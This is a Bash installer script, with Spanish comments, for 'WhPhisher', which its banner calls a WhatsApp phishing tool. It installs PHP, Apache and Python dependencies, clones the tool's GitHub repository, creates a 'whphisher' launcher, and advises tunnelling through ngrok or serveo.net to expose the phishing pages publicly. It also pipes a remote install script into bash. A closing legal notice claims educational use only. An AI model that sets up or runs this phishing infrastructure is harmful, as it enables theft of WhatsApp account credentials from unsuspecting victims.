#!/bin/bash

# Script para descargar e instalar WhPhisher desde GitHub
# https://github.com/cyberboyplas/WhPhisher
# Soporte para: Debian/Ubuntu, Arch/Manjaro, RedHat/Fedora, macOS

set -e  # Salir en caso de error

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Logo y banner
echo -e "${PURPLE}"
cat << "EOF"
__        _______ _     _       _               
\ \      / / ____| |__ (_)____| |__   ___ _ __ 
 \ \ /\ / /|  _| | '_ \| |_  / | '_ \ / _ \ '__|
  \ V  V / | |___| | | | |/ /| | |_) |  __/ |   
   \_/\_/  |_____|_| |_|_/___|_|_.__/ \___|_|   
EOF
echo -e "${NC}"
echo -e "${CYAN}     WhatsApp Phishing Tool Installer${NC}"
echo ""

# Detectar distribución
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
    elif command -v lsb_release &> /dev/null; then
        DISTRO=$(lsb_release -si | tr '[:upper:]' '[:lower:]')
    elif [ -f /etc/arch-release ]; then
        DISTRO="arch"
    elif [ -f /etc/debian_version ]; then
        DISTRO="debian"
    elif [ -f /etc/fedora-release ]; then
        DISTRO="fedora"
    elif [ -f /etc/redhat-release ]; then
        DISTRO="redhat"
    else
        DISTRO="unknown"
    fi
    echo "$DISTRO"
}

install_package_arch() {
    local package=$1
    echo -e "${YELLOW}Instalando $package usando pacman...${NC}"
    if command -v sudo &> /dev/null; then
        sudo pacman -Sy --noconfirm "$package" 2>/dev/null || {
            echo -e "${YELLOW}Paquete $package no encontrado, intentando con nombre alternativo...${NC}"
            return 1
        }
    else
        pacman -Sy --noconfirm "$package" 2>/dev/null || return 1
    fi
}

install_package_debian() {
    local package=$1
    echo -e "${YELLOW}Instalando $package usando apt...${NC}"
    if command -v sudo &> /dev/null; then
        sudo apt update && sudo apt install -y "$package"
    else
        apt update && apt install -y "$package"
    fi
}

install_package_redhat() {
    local package=$1
    echo -e "${YELLOW}Instalando $package usando yum/dnf...${NC}"
    if command -v dnf &> /dev/null; then
        if command -v sudo &> /dev/null; then
            sudo dnf install -y "$package"
        else
            dnf install -y "$package"
        fi
    else
        if command -v sudo &> /dev/null; then
            sudo yum install -y "$package"
        else
            yum install -y "$package"
        fi
    fi
}

install_package_macos() {
    local package=$1
    echo -e "${YELLOW}Instalando $package usando brew...${NC}"
    brew install "$package"
}

install_php_dependencies() {
    local distro=$(detect_distro)
    
    echo -e "${YELLOW}Instalando PHP y dependencias web...${NC}"
    
    case $distro in
        arch|manjaro|endeavouros)
            echo -e "${BLUE}Instalando PHP y servidor web para Arch...${NC}"
            install_package_arch "php" || install_package_arch "php8"
            install_package_arch "apache" || install_package_arch "apache2"
            install_package_arch "curl" 2>/dev/null || true
            ;;
            
        debian|ubuntu|kali|parrot|mint)
            echo -e "${BLUE}Instalando PHP y servidor web para Debian...${NC}"
            install_package_debian "php"
            install_package_debian "apache2"
            install_package_debian "curl"
            install_package_debian "libapache2-mod-php"
            ;;
            
        fedora|centos|rhel|redhat)
            echo -e "${BLUE}Instalando PHP y servidor web para RedHat...${NC}"
            install_package_redhat "php"
            install_package_redhat "httpd"
            install_package_redhat "curl"
            install_package_redhat "php-curl"
            ;;
            
        darwin|macos)
            echo -e "${BLUE}Instalando PHP para macOS...${NC}"
            install_package_macos "php"
            if ! command -v httpd &> /dev/null && ! command -v apache2 &> /dev/null; then
                echo -e "${YELLOW}Apache no encontrado, PHP tiene servidor web integrado${NC}"
            fi
            ;;
        *)
            echo -e "${YELLOW}Distribución no reconocida, instalando PHP genérico...${NC}"
            ;;
    esac
}

install_system_dependencies() {
    local distro=$(detect_distro)
    
    echo -e "${GREEN}Detectada distribución: $distro${NC}"
    
    case $distro in
        arch|manjaro|endeavouros)
            echo -e "${BLUE}Instalando dependencias para Arch Linux...${NC}"
            
            # Herramientas básicas
            for pkg in git python python-pip php apache curl wget; do
                if ! command -v ${pkg%%-*} &> /dev/null; then
                    install_package_arch "$pkg" 2>/dev/null || \
                    echo -e "${YELLOW}$pkg no disponible, continuando sin él...${NC}"
                fi
            done
            
            # Servicios
            echo -e "${YELLOW}Configurando servicios...${NC}"
            if command -v sudo &> /dev/null; then
                sudo systemctl enable --now apache 2>/dev/null || \
                sudo systemctl enable --now apache2 2>/dev/null || \
                sudo systemctl enable --now httpd 2>/dev/null || true
            fi
            ;;
            
        debian|ubuntu|kali|parrot|mint)
            echo -e "${BLUE}Instalando dependencias para Debian/Ubuntu...${NC}"
            
            # Herramientas básicas
            for pkg in git python3 python3-pip php apache2 curl wget; do
                if ! command -v ${pkg%%-*} &> /dev/null; then
                    install_package_debian "$pkg" 2>/dev/null || \
                    echo -e "${YELLOW}$pkg no disponible, continuando sin él...${NC}"
                fi
            done
            
            # Servicios
            echo -e "${YELLOW}Configurando servicios...${NC}"
            if command -v sudo &> /dev/null; then
                sudo systemctl enable --now apache2 2>/dev/null || true
            fi
            ;;
            
        fedora|centos|rhel|redhat)
            echo -e "${BLUE}Instalando dependencias para RedHat/Fedora...${NC}"
            
            # Herramientas básicas
            for pkg in git python3 python3-pip php httpd curl wget; do
                if ! command -v ${pkg%%-*} &> /dev/null; then
                    install_package_redhat "$pkg" 2>/dev/null || \
                    echo -e "${YELLOW}$pkg no disponible, continuando sin él...${NC}"
                fi
            done
            
            # Servicios
            echo -e "${YELLOW}Configurando servicios...${NC}"
            if command -v sudo &> /dev/null; then
                sudo systemctl enable --now httpd 2>/dev/null || true
            fi
            ;;
            
        darwin|macos)
            echo -e "${BLUE}Instalando dependencias para macOS...${NC}"
            
            if ! command -v brew &> /dev/null; then
                echo -e "${RED}Homebrew no está instalado. Instalando...${NC}"
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            for pkg in git python3 php curl wget; do
                if ! command -v $pkg &> /dev/null; then
                    install_package_macos "$pkg"
                fi
            done
            ;;
        *)
            echo -e "${YELLOW}Distribución no reconocida. Instalando dependencias genéricas...${NC}"
            ;;
    esac
    
    # Instalar PHP específicamente si no está instalado
    if ! command -v php &> /dev/null; then
        install_php_dependencies
    fi
}

check_web_services() {
    echo -e "${CYAN}=== Verificando servicios web ===${NC}"
    
    if command -v php &> /dev/null; then
        PHP_VERSION=$(php --version 2>/dev/null | head -n1 | cut -d' ' -f2)
        echo -e "${GREEN}✓ PHP $PHP_VERSION${NC}"
    else
        echo -e "${RED}✗ PHP (no instalado)${NC}"
    fi
    
    if command -v apache2 &> /dev/null || command -v httpd &> /dev/null || command -v apache &> /dev/null; then
        echo -e "${GREEN}✓ Apache${NC}"
    else
        echo -e "${YELLOW}⚠ Apache (no instalado, usando servidor PHP integrado)${NC}"
    fi
    
    if command -v curl &> /dev/null; then
        echo -e "${GREEN}✓ cURL${NC}"
    else
        echo -e "${YELLOW}⚠ cURL (no instalado)${NC}"
    fi
    echo ""
}

echo -e "${PURPLE}=== Instalador de WhPhisher ===${NC}"
echo -e "${BLUE}Repositorio: https://github.com/cyberboyplas/WhPhisher${NC}"
echo ""

# Verificar servicios web disponibles
check_web_services

# Verificar si Python está instalado
if ! command -v python3 &> /dev/null && ! command -v python &> /dev/null; then
    echo -e "${RED}Error: Python no está instalado${NC}"
    echo "Instalando Python..."
    distro=$(detect_distro)
    case $distro in
        arch|manjaro) install_package_arch "python" ;;
        debian|ubuntu) install_package_debian "python3 python3-pip" ;;
        fedora|centos) install_package_redhat "python3 python3-pip" ;;
        darwin|macos) install_package_macos "python" ;;
        *) echo "Por favor instala Python manualmente"; exit 1 ;;
    esac
fi

# Usar python3 o python según disponibilidad
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
else
    echo -e "${RED}✗ Python no disponible${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Python está instalado ($PYTHON_CMD)${NC}"

# Verificar si pip está instalado
if ! command -v pip3 &> /dev/null && ! command -v pip &> /dev/null; then
    echo -e "${RED}Error: pip no está instalado${NC}"
    distro=$(detect_distro)
    case $distro in
        arch|manjaro) install_package_arch "python-pip" ;;
        debian|ubuntu) install_package_debian "python3-pip" ;;
        fedora|centos) install_package_redhat "python3-pip" ;;
        darwin|macos) brew install python3 ;;
        *) echo "Por favor instala pip manualmente"; exit 1 ;;
    esac
fi

echo -e "${GREEN}✓ pip está disponible${NC}"

# Instalar dependencias del sistema
echo -e "${YELLOW}Instalando dependencias del sistema...${NC}"
install_system_dependencies

# Crear directorio de instalación
INSTALL_DIR="$HOME/.whphisher"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo -e "${YELLOW}Descargando WhPhisher...${NC}"

# Clonar el repositorio
if git clone https://github.com/cyberboyplas/WhPhisher.git . 2>/dev/null; then
    echo -e "${GREEN}✓ Repositorio clonado exitosamente${NC}"
else
    echo -e "${RED}✗ Error al clonar el repositorio${NC}"
    exit 1
fi

echo -e "${YELLOW}Analizando estructura del proyecto...${NC}"

# Verificar estructura de WhPhisher
if [ ! -f "whphisher.py" ] && [ ! -f "WhPhisher.py" ]; then
    echo -e "${YELLOW}Buscando archivo principal...${NC}"
    MAIN_FILE=$(find . -name "*.py" -type f | head -n1)
    if [ -z "$MAIN_FILE" ]; then
        echo -e "${RED}✗ No se encontró archivo Python principal${NC}"
        exit 1
    fi
else
    if [ -f "whphisher.py" ]; then
        MAIN_FILE="whphisher.py"
    else
        MAIN_FILE="WhPhisher.py"
    fi
fi

echo -e "${GREEN}✓ Archivo principal: $MAIN_FILE${NC}"

# Hacer el script ejecutable
chmod +x "$MAIN_FILE"

echo -e "${YELLOW}Instalando dependencias de Python...${NC}"

# Instalar dependencias comunes para herramientas de phishing
pip_deps=("requests" "colorama" "urllib3" "bs4" "BeautifulSoup4" "phonenumbers")

for dep in "${pip_deps[@]}"; do
    echo -e "${BLUE}Instalando $dep...${NC}"
    pip3 install "$dep" 2>/dev/null || pip install "$dep" 2>/dev/null || \
    echo -e "${YELLOW}No se pudo instalar $dep, continuando...${NC}"
done

# Verificar si hay requirements.txt
if [ -f "requirements.txt" ]; then
    echo -e "${BLUE}Instalando desde requirements.txt...${NC}"
    pip3 install -r requirements.txt 2>/dev/null || \
    pip install -r requirements.txt 2>/dev/null || \
    echo -e "${YELLOW}Algunas dependencias fallaron...${NC}"
fi

# Configurar permisos para archivos PHP
if [ -d "sites" ] || [ -d "templates" ]; then
    echo -e "${YELLOW}Configurando permisos para archivos web...${NC}"
    find . -name "*.php" -exec chmod 644 {} \; 2>/dev/null || true
    find . -name "*.html" -exec chmod 644 {} \; 2>/dev/null || true
fi

# Crear script de lanzamiento
echo -e "${YELLOW}Creando comando 'whphisher'...${NC}"

LOCAL_BIN="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN"

# Crear wrapper script
cat > "$LOCAL_BIN/whphisher" << EOF
#!/bin/bash
cd "$INSTALL_DIR"
$PYTHON_CMD $MAIN_FILE "\$@"
EOF

chmod +x "$LOCAL_BIN/whphisher"

# Crear lanzador global si es posible
if command -v sudo &> /dev/null && [ -w "/usr/local/bin" ] || sudo -n true; then
    echo -e "${YELLOW}Creando lanzador global...${NC}"
    sudo cp "$LOCAL_BIN/whphisher" "/usr/local/bin/whphisher" 2>/dev/null && \
    echo -e "${GREEN}✓ Comando global 'whphisher' creado${NC}" || \
    echo -e "${YELLOW}⚠ No se pudo crear comando global, usando local${NC}"
fi

# Configurar PATH si es necesario
if [[ ":$PATH:" != *":$LOCAL_BIN:"* ]]; then
    echo -e "${YELLOW}Configurando PATH...${NC}"
    
    for shell_file in ~/.bashrc ~/.zshrc ~/.profile; do
        if [ -f "$shell_file" ]; then
            if ! grep -q "\.local/bin" "$shell_file"; then
                echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$shell_file"
                echo -e "${GREEN}✓ PATH actualizado en $shell_file${NC}"
            fi
        fi
    done
    
    # Actualizar PATH en sesión actual
    export PATH="$HOME/.local/bin:$PATH"
fi

echo -e "${PURPLE}"
echo "╔══════════════════════════════════════════╗"
echo "║         WHPHISHER INSTALADO              ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}=== Información de instalación ===${NC}"
echo -e "${GREEN}Directorio: $INSTALL_DIR${NC}"
echo -e "${GREEN}Comando: whphisher${NC}"
echo ""

echo -e "${BLUE}=== Servicios configurados ===${NC}"
if command -v php &> /dev/null; then
    echo -e "${GREEN}✓ PHP listo${NC}"
fi
if command -v apache2 &> /dev/null || command -v httpd &> /dev/null; then
    echo -e "${GREEN}✓ Apache listo${NC}"
    echo -e "${YELLOW}  Nota: Asegúrate de que Apache esté ejecutándose${NC}"
fi
echo ""

echo -e "${YELLOW}=== Uso básico ===${NC}"
echo "  whphisher --help                    # Mostrar ayuda"
echo "  whphisher --start                   # Iniciar WhPhisher"
echo "  whphisher --tunnel manual           # Modo túnel manual"
echo "  whphisher --port 8080               # Usar puerto específico"
echo ""

echo -e "${RED}=== ADVERTENCIA LEGAL ===${NC}"
echo -e "${YELLOW}⚠ Esta herramienta es solo para fines educativos y de prueba${NC}"
echo -e "${YELLOW}⚠ Úsala solo en sistemas que te pertenezcan o tengas permiso${NC}"
echo -e "${YELLOW}⚠ El mal uso de esta herramienta es ilegal${NC}"
echo ""

echo -e "${GREEN}=== Próximos pasos ===${NC}"
echo -e "${CYAN}1. Ejecuta: whphisher --help${NC}"
echo -e "${CYAN}2. Asegúrate de tener PHP ejecutándose${NC}"
echo -e "${CYAN}3. Usa ngrok o serveo.net para tunneling${NC}"
echo ""

echo -e "${PURPLE}¡Instalación completada! Ejecuta 'whphisher' para comenzar.${NC}"

# Mostrar recordatorio de PATH si es necesario
if [[ ":$PATH:" != *":$LOCAL_BIN:"* ]]; then
    echo ""
    echo -e "${YELLOW}💡 Ejecuta este comando o reinicia tu terminal:${NC}"
    echo "source ~/.bashrc"
fi
